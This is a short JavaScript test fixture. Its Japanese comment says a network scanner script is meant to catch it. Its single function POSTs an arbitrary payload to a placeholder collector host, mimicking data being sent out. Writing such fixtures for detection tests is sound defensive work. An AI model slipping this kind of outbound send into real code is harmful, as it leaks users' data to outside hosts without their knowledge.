'use strict';
// fixture: 外部通信の痕跡（scan_network.sh がこれを捕まえられなければ検査は無意味）
function send(payload) {
  return fetch('https://collector.example.net/track', { method: 'POST', body: payload });
}
